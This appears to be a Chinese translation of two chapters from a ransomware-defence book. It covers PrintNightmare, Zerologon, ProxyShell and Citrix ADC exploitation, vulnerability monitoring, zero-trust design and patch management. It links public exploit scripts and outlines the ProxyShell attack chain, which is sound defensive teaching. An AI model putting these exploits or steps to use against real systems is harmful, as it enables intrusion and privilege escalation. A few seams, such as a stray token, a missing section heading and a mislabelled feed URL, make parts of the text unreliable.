  \n我们将要介绍的许多漏洞要么被用于初始入侵，要么用于获得对受损机器的提升权限，最后是横向移动。原因是为了让你了解入侵一台机器或服务是多么容易，以及从一个高严重性漏洞被公开到勒索软件运营商开始利用它的时间有多短。\n\
  \n所以，我们将重点关注以下漏洞：\n\n- **PrintNightmare:** CVE-2021-34527\n- **Zerologon:** CVE-2020-1472\n\
  - **ProxyShell:** 它由三个不同的漏洞组成，作为单一攻击链的一部分使用：CVE-2021-34473、CVE-2021-34523 和 CVE-2021-31207\n\
  - **Citrix NetScaler ADC:** CVE-2019-19781\n\n## PrintNightmare\n\n让我们从 PrintNightmare\
  \ 开始，这是一个于 2021 年 7 月发布的漏洞。利用此漏洞，攻击者可以在远程系统和本地系统上以系统权限运行任意代码，只要 Print Spooler 服务已启用。因此，理论上，你可以利用此漏洞使域控制器运行任意代码，只要\
  \ Print Spooler 服务正在运行。这是因为 Point and Print 功能中的功能，该功能允许用户自动从打印服务器直接下载打印机配置信息到客户端。\n\
  \n所有 Microsoft **Common Vulnerabilities and Exposures (CVEs)** 都在 MSRC 上发布，并附有专门的支持文章，说明受影响的系统以及在缓解措施和其他对策方面的建议，如\
  \ PrintNightmare 的情况在此处所示：`https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527`。\n\
  \n关于 PrintNightmare，InfoSec 社区制作了多个脚本，可以很容易地使用；例如，这里有一个简单的 PowerShell 有效载荷利用了该漏洞，无需管理员访问权限，并附带一个预定义的\
  \ DDL 文件，可在机器上创建本地管理员账户：`https://github.com/calebstewart/CVE-2021-1675`。\n\n**Mimikatz**\
  \ 的创建者 Benjamin Delpy 也创建了一个概念验证，他设置了一个公共 *print server*，你可以从终端点连接到该公共服务器，然后该服务器会自动创建一个以本地系统上下文运行的\
  \ CMD 窗格。\n\n微软花了数周时间才提供补丁和修复建议。在 8 月中旬，仅一个月后，就已有新闻报道称勒索软件运营商正在利用 PrintNightmare\
  \ 漏洞入侵组织。\n\n微软在漏洞被发现时提供了建议，即在提供安全修复之前禁用 Print Spooler 服务。这也让许多管理员意识到 Print Spooler\
  \ 服务不需要在非面向终端用户的服务器上运行，例如 Citrix/RDS 服务器。\n\n> **重要说明**\n> 一个普遍的最佳实践是确保服务上仅运行所需的服务——例如，Print\
  \ Spooler 服务*不应*在域控制器上运行。此微软指导文档提供了不同服务的列表以及每个服务的建议：https://docs.microsoft.com/en-us/windows-server/security/windows-services/security-guidelines-for-disabling-system-services-in-windows-server。\n\
  \n## Zerologon\n\n接下来是 Zerologon，另一个高严重性 CVE，利用了 Active Directory 中 Netlogon 进程的漏洞，允许攻击者冒充任何计算机，包括域控制器。\n\
  \n要利用此漏洞，攻击需要能够与域控制器通信，例如拥有加入 Active Directory 域的 Windows 客户端。\n\n然后，攻击者会伪造基础设施中的另一个域控制器，并使用\
  \ MS-NRPC 协议更改 Active Directory 中机器账户的密码，这就像发送一个带有新密码的简单 TCP 帧一样简单：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_42_0.png)\n\
  \n图 1.11 – Zerologon 攻击流程\n\n一旦新密码被接受，攻击者就可以使用该新账户以 Active Directory 域控制器上下文启动新进程，然后用于入侵剩余的基础设施。Zerologon\
  \ 已在许多勒索软件攻击中被用于通过横向移动入侵 Active Directory 并获得对域控制器的访问权限。\n\n此漏洞在微软 2020 年 8 月的补丁中得到修复。2020\
  \ 年 9 月，发现该漏洞的 Secura 安全研究人员发布了他们的研究成果，一周之内就已经发布了不同的概念验证，说明如何利用该漏洞。你可以在此处找到有关该漏洞的初始白皮书的链接：https://www.secura.com/uploads/whitepapers/Zerologon.pdf。\n\
  \n在随后的几个月里，许多组织都遭到 Ruyk 的攻击，他们使用了 Zerologon 漏洞。平均而言，大多数安全研究人员表示，从供应商发布补丁到平均组织安装补丁，通常需要\
  \ 60 到 150 天（约 5 个月）。\n\n## ProxyShell\n\n然后是 ProxyShell，这是一个由三个不同 CVE 组成的漏洞，作为单一攻击链的一部分使用，影响了\
  \ Microsoft Exchange 2013/2016/2019，允许攻击者进行预认证 RCE。\n\n主要漏洞位于 Exchange 中的 Client\
  \ Access Service (CAS) 服务器组件中，该组件默认暴露于互联网，以允许终端用户从外部访问电子邮件服务。\n\n简而言之，ProxyShell\
  \ 漏洞利用执行以下操作：\n\n- 发送 Autodiscover 请求，使用已知的电子邮件地址泄露用户的 LegacyDN 信息。\n- 向 CAS 服务器发送\
  \ MAPI 请求，使用 LegacyDN 泄露用户的 SID。\n- 使用 SID 和电子邮件地址从 CAS 服务构建有效的身份验证令牌。\n- 使用身份验证令牌对\
  \ PowerShell 端点进行身份验证并执行代码。示例代码可在 GitHub 上找到，地址为 https://github.com/horizon3ai/proxyshell。\n\
  \nHorizon3.ai 发布了一个 Python 脚本来展示利用此漏洞是多么容易（https://github.com/horizon3ai/proxyshell），你只需运行脚本并指向\
  \ Exchange CAS 服务器即可。\n\n所有这些漏洞都在 2021 年 4 月得到修补，但信息在 2021 年 6 月才公开发布。\n\n2022 年\
  \ 2 月发现，相当数量的组织未能更新其 Exchange 服务，尽管这是紧急需要的。更准确地说，4.3% 的所有可公开访问的 Microsoft Exchange\
  \ 服务仍未修补 ProxyShell 漏洞。在那些确实应用了 ProxyShell 补丁的组织中，16% 的组织未安装 2021 年 7 月以后发布的后续补丁，这使它们仍然容易受到攻击。因此，许多组织在六个月过去后仍未完全消除该漏洞。如以下\
  \ 2022 年 2 月的 Shodan 截图所示，仍有相当数量的面向公众的 Exchange 服务器存在该漏洞：\n\n\n\n\n\n这引发了巨大的动荡，近6万台易受攻击的Citrix\
  \ ADC服务器受到影响，因为漏洞已经公开，而Citrix尚未准备好补丁。该漏洞于2019年底公开，而Citrix预计在2020年1月底才能提供补丁。此漏洞还影响了ADC平台的四个主要版本，这意味着补丁需要向后移植到早期版本，这影响了补丁准备就绪的时间线。\n\
  \n尽管Citrix提供了缓解该漏洞的变通方案，但由于许可问题以及部分功能不可用，该方案并非适用于所有软件版本。\n\n最终，补丁发布，漏洞被修复，但许多ADC实例已被攻陷。许多实例被感染了简单的比特币挖矿脚本，另一些则被用于部署Web\
  \ Shell。\n\n有一个后来被称为“Iran Network Team”的组织在他们入侵的每台ADC设备上都创建了一个Web Shell。该组织在大量ADC设备上成功部署了后门。其中许多设备已经打了补丁，但由于攻击者在其设备上留下的无密码后门，它们仍然易受攻击。这个Web\
  \ Shell只需通过一个简单的HTTP POST命令即可轻松访问。\n\n此外，另一个威胁行为者创建了一个名为NOTROBIN的新后门。他们不是部署Web Shell或挖矿，而是添加自己的带有预定义感染密钥的Shell。此外，他们还会尝试识别并移除任何现有的后门，并尝试阻止对受影响设备的进一步利用。他们通过删除不包含特定感染密钥的新XML文件或脚本来实现这一点。这意味着受感染的ADC设备只能通过带有感染密钥的后门访问。\n\
  \n回顾我所介绍的这些漏洞，其中许多都被用作勒索软件攻击的一部分。需要注意以下几点：\n\n- 从漏洞被发现到攻击者开始利用它之间的时间越来越短。\n- 你应该始终尽快应用安全补丁，因为在许多情况下，你可能直到为时已晚才意识到漏洞的影响。\n\
  - 漏洞公开后，如果安装补丁修复它花费的时间太长，那么很可能已经有人利用了该漏洞。\n- 此外，在许多情况下，攻击者可能已经利用该漏洞创建了后门，即使在安装补丁后，该后门仍可能被利用。\n\
  - 许多漏洞在最初公开后会演变。这意味着漏洞被知晓后，许多安全研究人员或攻击者可以找到利用该漏洞的新方法，或者在同一产品/功能/服务中发现漏洞，PrintNightmare就是这种情况。\n\
  - CVE的数量逐年增加：https://www.cvedetails.com/browse-by-date.php。\n\n这属于一个称为**漏洞管理**的类别，即识别和修复软件漏洞的实践。修复软件漏洞可以通过配置更改完成，或者大多数情况下，通过应用供应商提供的软件补丁来完成。我们将在*第10章，保护Windows免受勒索软件攻击的最佳实践*中介绍使用工具来修补基础设施和服务，但我想介绍的一件事是如何监控漏洞。\n\
  \n虽然可以使用许多商业产品，但我也倾向于使用其他在线数据源，如下所列，而且社交媒体上的许多来源也非常有用。\n\n例如，您可以使用集中式RSS源来监控不同供应商的安全公告。这是我用来监控供应商漏洞的最常用工具。大多数网站都有RSS源，我可以将其收集到Feedly等RSS阅读器中。我使用的一些RSS源如下：\n\
  \n- VMware安全公告RSS源：https://www.vmware.com/security/advisories.xml。\n- Citrix安全RSS源：https://tools.cisco.com/security/center/rss.x?i=44。\n\
  - NIST RSS源：https://nvd.nist.gov/vuln/data-feeds。\n\n除了不同的软件供应商之外，我还关注NIST的集中式RSS源。然而，这不是针对特定供应商的，所以我经常用它来将供应商特定的信息与NIST进行关联。\n\
  \n- Microsoft不再使用RSS，而是使用电子邮件通知，您可以在此处注册：https://www.microsoft.com/en-us/msrc/technical-security-notifications?rtc=1。不过，我确实会关注**微软安全响应中心（MSRC）**博客，该博客重点介绍一些严重程度较高的漏洞：https://msrc-blog.microsoft.com/。\n\
  \n需要注意的是，根据您使用的不同供应商，监控所有这些RSS源可能是一个耗时且重复的过程。在许多情况下，您应该将RSS源的数量限制到最少。一些供应商还具有良好的过滤功能，这样您就不会收到与您所没有的产品相关的漏洞信息。浏览这些源中的信息应该成为一种例行工作。在较大的IT团队中，这项任务应由多人轮换执行——例如，应该有人负责浏览信息，并在周一早上呈现相关信息。\n\
  \n虽然RSS源是获取这些信息的一种方式，但我还使用其他一些在线来源来监控当前形势：\n\n- **Vulmon**：这提供了一种自动获取与漏洞相关的警报和通知的方式，并且可以映射到产品。您可以在此处查看最新漏洞：https://vulmon.com/searchpage?q=*&sortby=bydate。此外，您可以将Vulmon用作搜索引擎来查找相关漏洞和更多信息。\n\
  - **社交媒体**：Twitter对于监控当前威胁/漏洞可能是一个非常有用的服务。作为Twitter的活跃用户，我有一些关注的主要来源，以了解当前威胁/漏洞的最新情况：\n\
  \  - vFeed Inc. 漏洞情报即服务（@vFeed_IO）\n  - Threat Intel Center（@threatintelctr）\n\n\
  还有一些第三方供应商的产品可以自动化扫描环境并查看当前漏洞，例如Qualys和Rapid7的服务，当您在一个大型环境中混合使用大量第三方服务时，这些工具可以成为您工具箱中的得力工具。需要注意的是，这些产品并不能100%覆盖所有产品/供应商，因此您仍然需要映射当前应用程序供应商及其提供的服务/应用程序，并确保监控每个应用程序的状态。\n\
  \n## 总结\n\n在本章中，我们深入了解了勒索软件运营商用来入门的一些主要攻击向量，无论是通过使用现有凭据还是网络钓鱼攻击来诱骗最终用户并获得对受感染机器的访问权限。\n\
  \n在大多数情况下，攻击者会利用一个或多个漏洞，要么直接在最终用户的机器上，要么利用组织可用的外部服务。\n\n我们还研究了一些攻击者使用的勒索策略，以及其他攻击向量，例如DDoS攻击，以迫使组织支付赎金。\n\
  \n然后，我们仔细研究了一些较为知名的勒索软件运营商及其作案手法，以及一些更常使用的涉及身份和利用漏洞的攻击向量，以及它们如何被用于成功的攻击中。\n\n最后，我们研究了如何监控漏洞，以及一些在您的工具箱中可以成为有用资产的来源。\n\
  \n在下一章中，我们将开始研究对策，为我们的IT服务构建安全基础，并采用基于零信任的安全架构。\n\n\n\n"
- "# 构建安全基础\n\n在上一章中，我们深入了解了勒索软件是什么、它是如何运作的、攻击向量有哪些，以及一些不同的勒索软件团伙如何活动。在本章中，我们将首先从架构角度探讨安全基础应该是什么样子；我们还将探讨在网络安全设计、身份访问和发布外部服务方面的一些常见最佳实践。\n\
  \n本章将更多聚焦于高层设计和不同的安全最佳实践，之后我们会在后续章节实现本章提到的不同功能时再详细阐述。最后，我们将仔细研究构建安全监控平台的一些关键组件。\n\
  \n我们还将仔细研究如何使用 Microsoft 参考架构在 Microsoft Azure 中构建新的安全基础，以及这些架构如何保护你的服务和数据。\n\n\
  虽然大多数勒索软件攻击都始于最终用户，源于网络钓鱼攻击，但也有许多攻击始于黑客利用某些漏洞或对外部服务执行暴力破解攻击，然后利用他们在网络中发现的漏洞在网络中横向移动。\n\
  \n我们还见过攻击者使用伪造或木马化的应用程序进入后门，这些后门被用来获取访问权限，或者属于供应链攻击的一部分，类似于 Kaseya 攻击中发生的情况。\n\n\
  如果你所在的公司正考虑迁往云端，这意味着你需要做一些工作来构建一个安全基础，使其包含云平台供应商的常见最佳实践，并能够支持你当前的需求。\n\n在本章中，我们将介绍以下主题：\n\
  \n- 安全基础的零信任设计原则\n- 构建安全的网络访问\n- 保持对身份和访问控制的管控\n- 安全日志记录与监控的基础\n- 在 Microsoft Azure\
  \ 中构建安全基础的关键组件\n\n## 零信任设计原则\n\n如上一章所述，没有安全基础的组织很容易成为勒索软件攻击的受害者。这可能是因为其环境中缺乏安全机制，或对身份（例如用户账户、服务账户、令牌）以及未修补漏洞缺乏适当控制。\n\
  \n一个正成为任何安全基础通用安全标准的主要安全设计原则是 **零信任** 架构。零信任不是一种产品，而是一套安全原则和指南，其重点在于不再让服务和用户拥有隐式信任访问，而是转向默认不信任任何人的模式。\n\
  \n简而言之，其目标是防止对数据和服务的未经授权访问，同时让访问控制的执行尽可能精细化。\n\n让我用一个例子来说明基于零信任的方法如何降低风险。\n\n当你有一个\
  \ Active Directory 域，并且用户在办公室的计算机上登录时，除了用户名和密码（以及该计算机具有机器账户）之外，没有对用户身份的验证。没有额外的检查来确定该用户是否确实是他所声称的那个人，或者是否有未经授权的人窃取了他的用户名和密码。\n\
  \n此外，连接到办公室的计算机拥有一个默认被域和 Active Directory 隐式信任的机器账户。没有安全检查来验证该计算机是否安全。\n\n另一个例子是用户在家中或其他地点连接的外部服务。在大多数情况下，你有用户名、密码和某种形式的\
  \ MFA 令牌来进行身份验证。虽然这限制了谁能进行身份验证，只有同时拥有用户名、密码和 MFA 令牌的人才能通过，但它没有考虑设备的健康状况，或者设备可能在某个人登录服务之前就已经受损。\n\
  \n在我于新冠疫情期间处理的一个案例中，有一名员工在家中使用他的计算机工作，该计算机通过 **Always On** VPN 连接到公司网络。\n\n**Always\
  \ On** 使用不同的 **Windows 角色**（包括**路由**、**远程访问**和**网络策略服务**）以及 Active Directory 颁发的证书的组合，让设备能够识别并验证服务，从而建立隧道。在这个案例中，问题在于该设备先前已经通过网络钓鱼攻击被入侵，而借助这条\
  \ VPN 隧道，攻击者能够进入网络，并在内部基础设施中取得立足点。他们最终利用包括 **Zerologon** 在内的多种漏洞组合，获得了对整个基础设施的访问权限。\n\
  \n> **注意**\n> Always On VPN 支持与 Azure AD 条件访问集成；在这种情况下，它可以在验证身份并建立隧道之前，检查用户是否符合合规要求以及与用户相关的风险。在我的示例中，这会有效阻止此攻击，因为攻击者入侵终端后，Windows\
  \ 中的安全服务被停止，导致设备在 **Microsoft Intune** 中被标记为不合规。应当注意，攻击者也可以篡改 MEM/Intune 设置的配置，因为他们通常会尝试停止\
  \ EDR 代理或其他防病毒机制。\n\n当今许多传统系统依赖隐式信任，这也是勒索软件运营者所利用的根本风险之一；一旦他们获得访问权限，就能在网络中横向移动。\n\
  \n所以，这些仅仅是一些过度依赖用户名和密码进行身份验证而不检查上下文的服务示例；而上下文检查正是任何基于零信任的安全架构中的一个重要方面。\n\n零信任架构由五个不同的支柱组成，这些支柱会在不同成熟度级别上进行衡量。这些支柱如下：\n\
  \n- 身份\n- 设备\n- 网络/环境\n- 应用程序\n- 数据\n\n首先，让我们探讨身份支柱的一个示例。\n\n### 身份支柱 – 零信任成熟度\n\
  \n身份支柱列出了关于零信任的身份功能，以及在身份上下文中的可见性与分析、自动化与编排、治理方面的考量。\n\n下表展示了如何衡量身份领域内零信任采用的成熟度水平。例如，风险评估是一项重要功能；要达到最优水平，你需要具备能够检测异常用户行为的安全机制：\n\
  \n| 功能 | 传统 | 优化 |\n|---|---|---|\n| 身份验证 | 使用用户名、密码以及可能的 MFA 进行身份验证 | 持续验证身份和用户活动\
  \ |\n| 身份提供商 | Active Directory | 跨云提供商和本地环境同步的全局身份存储 |\n| 风险评估 | 有限地检查用户风险 | **用户行为分析**（UBA），并使用机器学习来确定风险\
  \ |\n| 可见性与分析 | 在单一来源中记录用户身份验证 | 来自不同数据源的集中式日志源，并使用用户与实体行为分析 |\n| 自动化与编排 | 从 HR\
  \ 系统到身份提供商的一些有限自动化 | 用户和组的完全编排生命周期管理，包括即时访问和最小权限访问 |\n| 治理能力 | 使用审计和有限的技术策略进行手动检查，以强制密码长度并禁止重复使用旧密码\
  \ | 完全自动化的访问审查，通过 MFA 和自助服务强制更改密码 |\n\n表 2.1 – 零信任架构的身份支柱\n\n在零信任优化的身份支柱中，我们跨不同服务集中收集日志，并可以使用这些数据来监控行为分析。此外，我们跨不同服务和身份源实现了与用户生命周期管理相关的完全自动化。\n\
  \n我们还拥有机器学习能力，可以根据收集到的数据理解正常用户模式，并检测异常用户活动。\n\n虽然直接进入优化的基于身份的零信任模型并不简单，但我们将在第 7\
  \ 章 *使用 Azure 信息保护与数据保护保护信息* 中介绍一些不同的机制。\n\n设备是第二个支柱。在这里，我们同样可以通过从传统方法过渡到优化的零信任方法来衡量成熟度水平。\n\
  \n\n\n\n### 设备支柱 –零信任成熟度\n\n设备是指任何可以连接到网络的硬件资产，包括**物联网 (IoT)** 设备、手机、笔记本电脑、服务器等。本表列出了设备在零信任方面的功能。例如，一个至关重要的功能是合规性监控，用于监控设备的整体安全态势，然后据此计算整体风险：\n\
  \n| 功能 | 传统 | 优化 |\n|---|---|---|\n| 合规性监控 | 有限或没有设备合规机制 | 不断监控设备安全态势 |\n| 数据访问\
  \ | 在无需了解流量流向的情况下访问数据 | 基于设备实时风险分析授予数据访问权限 |\n| 资产管理 | 有限或没有资产管理 | 在所有环境中集成资产和漏洞管理\
  \ |\n| 可见性和分析 | 对设备的可见性或监控有限 | 持续运行设备态势并通过 EDR 或类似安全产品深入了解端点上的流程和更改 |\n\n表 2.2 –\
  \ 零信任架构的设备支柱\n\n设备支柱在于建立合规性和安全态势机制来监控设备的健康状况。这确保了不符合要求的设备无法根据风险级别访问内部数据或应用程序。\n\n\
  例如，使用 Azure AD 和条件访问，我们有一个功能要求用户拥有合规设备。这意味着用户要访问特定应用程序或服务，其设备需要满足 Intune 合规设置中定义的所有设置。\n\
  \n这意味着我们可以定义设备需要启用防火墙、运行防病毒软件、启用 BitLocker 等才能成为合规设备。\n\n我们还可以指定，如果用户来自非合规设备，他们只能访问某些应用程序。\n\
  \n### 网络支柱 –零信任成熟度\n\n随着组织转向基于零信任的网络，他们需要根据应用程序/服务的需要调整网络访问和安全服务，而不是传统网络安全中的隐式信任。\n\
  \n网络支柱展示了零信任的不同功能，并展示了不同组织应努力实现的不同成熟度级别：\n\n| 功能 | 传统 | 优化 |\n|---|---|---|\n| 网络分段\
  \ | 使用大型边界和宏观分段的网络架构，例如 VLAN 和区域划分 | 基于分布式入口/出口微边界和基于应用程序和服务的内部微分段的网络架构 |\n| 威胁防护\
  \ | 主要使用已知威胁和静态流量过滤进行威胁防护 | 网络集成机器学习，使用来自其他支柱的上下文信号进行威胁防护和过滤 |\n| 加密 | 服务明确加密，但对内部和外部流量加密有限\
  \ | 尽可能对所有服务和流量进行加密 |\n| 自动化和编排 | 更改手动实施 | 使用编排工具（如 CI/CD 和 IaC）实施更改 |\n| 可见性和分析\
  \ | 基于边界的流量模式可见性和集中式日志分析 | 跨多种传感器类型的集成分析，具有自动化警报和触发器 |\n\n表 2.3 – 零信任架构的网络支柱\n\n\
  与网络支柱相关的最重要方面之一是确保分段基于应用程序及其工作负载，而不是更传统的基于区域的方法。例如，如果用户需要访问需要某种形式 VPN 的特定应用程序，该服务将只提供基于每个应用程序的\
  \ VPN，并且该访问围绕应用程序，而不是提供对整个网络的访问。\n\n### 应用程序支柱 –零信任成熟度\n\n为了确保应用程序基于零信任原则，组织需要确保他们拥有提供应用程序可见性和漏洞评估的保护机制\n\
  \n并贯穿其生命周期。这意味着使用例如自动化机制，如将安全测试作为 CI/CD 流水线的一部分：\n\n| 功能 | 传统 | 优化 |\n|---|---|---|\n\
  | 访问授权 | 对应用程序的访问主要基于本地授权和静态属性 | 访问基于实时风险分析持续监控 |\n| 威胁防护 | 与应用程序工作流的集成有限，并对已知威胁应用通用保护\
  \ | 将威胁防护深度集成到应用程序工作流中 |\n| 可访问性 | 应用程序由用户通过互联网直接访问，其他用户通过 VPN 访问 | 所有应用程序都可直接通过互联网供用户访问。这将网络访问最小化为仅应用程序，而非整个网络\
  \ |\n| 应用程序安全 | 在部署前使用静态和手动方法进行应用程序安全测试 | 在开发和部署过程中使用 CI/CD 集成应用程序安全测试 |\n| 可见性和分析能力\
  \ | 对外部传感器和系统的应用程序健康和安全监控 | 对外部和内部系统的持续动态健康和安全监控 |\n\n表 2.4 – 零信任架构的应用程序支柱\n\n获得对现代应用程序的良好控制的困难在于它们所具有的不断增长的漏洞和依赖项数量。解决这个问题需要对开发人员进行安全服务或应用程序构建的教育，并利用诸如安全代码扫描和依赖项扫描之类的工具。\n\
  \n### 数据支柱 –零信任成熟度\n\n数据是我们最宝贵的资产，我们在网络安全方面必须转向*数据中心*的方法。本表展示了我们如何转向更基于零信任的安全策略，关于我们应如何确保数据安全。\n\
  \n第一步应该是识别、分类和盘点数据，并确保您对最关键的数据资产有足够的加密：\n\n| 功能 | 传统 | 优化 |\n|---|---|---|\n| 库存管理\
  \ | 数据未盘点或盘点不佳 | 数据不断盘点并带有标签和跟踪。 |\n| 加密 | 数据主要存储在本地，未进行静态加密 | 数据对所有静态数据进行加密，并结合基于文件的加密。\
  \ |\n| 访问机制 | 访问基于静态访问控制，例如组成员身份 | 对数据的访问是动态的，并支持即时机制和基于持续风险的检测。 |\n| 可见性和分析能力 |\
  \ 拥有有限的数据库存，无法提供有用的可见性 | 所有数据均已盘点，访问已记录。访问会被分析以查找可疑流量模式。 |\n\n表 2.5 – 零信任架构的数据支柱\n\
  \n如果您想阅读有关不同支柱成熟度级别的更多信息并参考零信任架构，我建议您阅读 NIST 关于零信任的零信任标准框架 https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-207.pdf。\n\
  \n虽然零信任旨在作为安全设计原则的供应商中立方法，但它仍然需要一套紧密集成的<|message|>\n\n\n\n- 在端点上运行的、需要访问某些内部数据源或应用程序服务的应用程序\n\
  - 用户需要访问的内部Web应用程序\n\n使用来自端点的VPN客户端可以轻松解决对这些服务的访问问题；然而，这意味着我们仍然面临同样多的风险。由于用户和端点随后可以访问不同的服务，如果一个端点被攻破，它就可能被用来攻击所有这些不同的服务。\n\
  \n这就是一个新术语的用武之地：**零信任网络访问（ZTNA）**。它旨在减少攻击面。该术语不与任何供应商绑定，但其背后的主要概念是，不是像我们通常使用VPN那样提供完全信任的网络访问，而是根据定义好的访问权限提供对内部服务的安全远程访问。这意味着用户只能被授予访问所需应用程序或服务的权限；访问权限始终会被评估，并且通常涉及使用身份风险计算和设备合规性/状态检查。\n\
  \n正如前面提到的示例，条件访问（Conditional Access）在允许用户访问之前提供这些类型的安全检查。还应注意，许多供应商提供类似的功能，但使用不同的名称。\n\
  \n让我用一个例子来说明。微软在 **Azure AD** 中有一项名为 **Azure AD 应用程序代理** 的服务，它允许我们通过反向代理解决方案发布内部Web应用程序。\n\
  \n该服务本身需要一个连接器，该连接器需要安装在您基础设施中的Windows机器上，然后它将与Azure AD通信。\n\n该服务与Azure AD集成，这意味着我们可以使用现有的集成来收集以下信息：\n\
  \n- 用户风险（来自Azure AD）\n- 设备风险（来自Intune、Defender for Endpoint和Defender for Cloud Apps）\n\
  \n因此，为了让实际最终用户能够访问内部Web应用程序，我们可以在Azure AD中设置一个**条件访问策略**，在用户获得访问权限之前验证用户和设备几乎没有风险。我们还可以在条件访问中定义用户需要先通过MFA进行身份验证才能获得访问权限，以确保除了实际最终用户之外没有其他人试图向服务进行身份验证：\n\
  \n图2.1 – 使用Azure应用程序代理的安全身份验证概述\n\n这意味着用户只有在设备合规且与该用户关联的风险为零时，才能访问Web应用程序。\n\n然而，这只解决了难题的一部分，即访问内部Web应用程序。但是，文件共享、Active\
  \ Directory以及端点需要访问的其他服务呢？\n\nActive Directory访问很难安全地解决，因为它需要在最终用户机器和域控制器之间打开大量端口，尤其是因为Windows使用大量随机端口进行访问。\n\
  \n我能提供的最好建议之一是，您应该开始考虑将最终用户机器从Active Directory迁移到Azure AD，微软正在大力投资于此。\n\n将机器迁移到Azure\
  \ AD意味着您只需要Internet连接即可向服务进行身份验证，而无需位于公司网络内部。微软正在将更多功能引入Azure AD及其周边生态系统。这带来的另一个好处是，它将有效阻止大多数勒索软件恶意软件加载程序在普通端点上触发。\n\
  \n当今勒索软件运营者使用的许多不同工具和脚本都以某种方式依赖对Active Directory的访问，以便绘制网络地图并尝试获得访问权限。如果端点已加入Azure\
  \ AD，这意味着他们拥有的大部分工具将无法工作。\n\n> **重要说明**\n> 微软对于设备如何加入Azure AD有不同的定义。这些定义包括 **Azure\
  \ AD 已注册**、**Azure AD 已加入** 或 **混合 Azure AD 已加入**。Azure AD 已注册设备通常用于**自带设备（BYOD）**和移动设备。Azure\
  \ AD 已加入设备通常是公司拥有的设备，且仅适用于Windows设备。混合加入是指先在Active Directory中注册设备，再将其同步到Azure AD的组合方式。\n\
  \n应该注意，让设备加入Azure AD意味着设备不再拥有对内部资源的同等访问权限，例如文件服务器以及依赖基于Windows的身份验证的其他数据源或应用程序。这意味着如果您希望最终用户能够访问应用程序，这些应用程序将需要支持基于Azure\
  \ AD的身份验证，例如 **SAML** 或 **OAuth**。\n\n运行Windows Server和SMB的常规文件服务器默认不支持基于Azure AD的身份验证，因此您需要迁移到另一个文件服务，例如使用\
  \ **OneDrive** 的 **Office 365**，或者迁移到支持SMB并结合基于Azure AD的身份验证的文件服务。\n\n此外，依赖基于Windows的身份验证的应用程序不再提供SSO，因为端点不再依赖**Kerberos**或**NTLM**的使用。这意味着您需要研究其他与Azure\
  \ AD一起支持的方式，将应用程序发布给最终用户。\n\n这里应该提到的最后一点是，微软最近推出了一项名为“混合云信任”的功能，该功能允许基于Azure AD和混合加入的设备对本地文件服务器进行身份验证。由于该服务的早期版本，它有几个要求，包括一个PKI服务，用于向最终用户机器颁发证书以使用它。\n\
  \n使用Azure AD Kerberos，云Kerberos信任消除了对PKI的需求。Azure AD可以为一个或多个AD域颁发身份验证票据，Windows可以利用这些票据通过Windows\
  \ Hello for Business进行身份验证，以及访问传统的基于AD的资源。本地域控制器仍然负责Kerberos服务票据和授权。\n\n## 漏洞和补丁管理\n\
  \n在任何环境中，一个重要方面是漏洞管理。漏洞管理远不止关注软件漏洞，但本书将仅专注于识别和修复软件层面的安全漏洞。漏洞管理可分为五个主要阶段：\n\n- 1.\
  \ **评估：** 这涉及定义所有资产并扫描漏洞。这可以使用第三方应用程序、手动脚本或您可能拥有的其他工具来自动化。例如，Rapid7和Qualys等供应商拥有可用于扫描整个基础设施以查找已知漏洞的产品和云服务。微软也在其名为Defender\
  \ for Endpoint和Defender for Servers的产品中内置了漏洞检测服务。但是，该产品仅涵盖Windows机器以及这些机器上安装的第三方应用程序。与Rapid7和Qualys的产品不同，它不涵盖VMware、Citrix\
  \ ADC等第三方软件。\n- 2. **确定优先级：** 虽然您应该始终尽快实施安全补丁或更新，但并非总是可行的，可能是因为能力不足或需要一些规划。这是因为某些安全补丁可能需要服务停机或重启，这可能会影响核心服务的可用性。此外，某些漏洞可能并不严重。因此，您应始终根据风险严重程度对漏洞进行优先级排序。\n\
  - 3. **行动：** 这是我们在可能的情况下修复已识别漏洞的地方。也可能存在这样的情况：我们没有有效的修复方案来补救漏洞，或者目前唯一可以应用的修复是临时解决方案。例如，2019年Citrix\
  \ NetScaler中存在的严重漏洞，Citrix花了近3周时间才为该漏洞提供了补丁。与此同时，消除漏洞的唯一方法是应用临时解决方案。在某些情况下，您可能根本没有安全补丁或更新，因此您可能需要应用其他缓解控制措施，或者仅仅接受漏洞的风险。\n\
  - 4. **重新评估：** 此步骤旨在确保补救或缓解措施取得成功。另一个关键步骤是确保在此期间没有人能够利用该漏洞。第一部分涉及使用一些工具来验证修复；一个例子是Log4j2漏洞，该漏洞在2021年12月众所周知，影响了全球数百万个端点。社区很快发布了不同的工具，可用于判断某个端点是否存在漏洞，如下所示：`https://github.com/logpresso/CVE-2021-44228-Scanner`。当然，我们不会为所有漏洞都获得这些类型的工具或脚本——在许多情况下，我们只需要依赖供应商的发行说明或文档。然而，我经常使用社交媒体，看看能否找到其他已经做过功课的人，以及能否借用一些脚本/工具，甚至从他人那里获取一些信息，来确定是否有可以做的事情。一些商业工具/产品可以确定漏洞是否已修复。需要记住的一点是，在许多情况下，当漏洞公开时，例如PrintNightmare，许多不同的安全研究人员开始更深入地研究该漏洞和代码，并发现许多利用该漏洞的新方法。一旦微软发布了补丁来修复PrintNightmare的初始漏洞，新的漏洞又出现了，这意味着在许多情况下，我们需要重复这些步骤来修复额外的漏洞。\n\
  \n\n\n\n5. **改进：** 最后的方面是关于持续改进。例如，你可能会发现过去一年中，有一项服务极易受到大量高严重性漏洞的影响。我们应该考虑一种新的方式来暴露此服务，以确保未来的漏洞不会带来同等风险。因此，这关乎于理解漏洞生命周期，并查看你是否能够演进和改进整体安全平台，以便主动防御任何未来的漏洞。\n\
  \n现在，让我们进行一个理论练习。2021年，当PrintNightmare漏洞公开时，我与许多客户合作，了解该漏洞的影响，并查看是否有办法缓解此风险。我们将工作映射到这五个不同的阶段。\n\
  \n## PrintNightmare 的漏洞管理示例\n\n以下是为 PrintNightmare 设置漏洞管理流程中不同任务的示例：\n\n- **评估：**\n\
  \  - 收集有关漏洞的信息。\n  - 阅读 Microsoft 安全响应中心知识库文章，了解缓解或规避漏洞的额外步骤\n  - 确定漏洞可被利用进行 **远程代码执行\
  \ (RCE)** 或 **本地代码执行 (LCE)** 以提升至系统权限。\n  - 影响所有当前 Windows 操作系统。\n  - CVSS 分数为 8。\n\
